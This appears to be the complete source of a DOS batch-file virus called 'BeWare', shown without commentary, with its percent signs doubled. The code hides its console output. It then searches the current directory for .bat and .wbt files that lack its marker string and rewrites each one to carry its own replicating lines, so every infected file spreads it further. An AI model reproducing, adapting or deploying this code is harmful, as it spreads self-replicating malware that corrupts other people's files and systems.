@REM BeWare
@goto RunBeWare
:Comon %%BeWare%%
@ctty nul%%BeWare%%
if ^%%1==^BeWareBAT goto BeWareBAT
if ^%%1==^BeWareWBT goto BeWareWBT
for %%%%b in (*.bat) do call %%0 BeWareBAT %%%%b
for %%%%w in (*.wbt) do call %%0 BeWareWBT %%%%w
del $BeWare$
goto End%%BeWare%%
:BeWareBAT
find ""BeWare""<%%2
if not errorlevel 1 goto End%%BeWare%%
copy %%2 $BeWare$
echo.>>$BeWare$
echo @goto Comon>>$BeWare$
echo :End>>$BeWare$
find ""BeWare""<%%0>%%2
type $BeWare$>>%%2
goto End%%BeWare%%
:BeWareWBT
find ""BeWare""<%%2
if not errorlevel 1 goto End%%BeWare%%
copy %%2 $BeWare$
find ""BeWare%%BeWare%%!""<%%0>%%2
type $BeWare$>>%%2
goto End%%BeWare%%
:RunBeWare
@goto Comon
:End
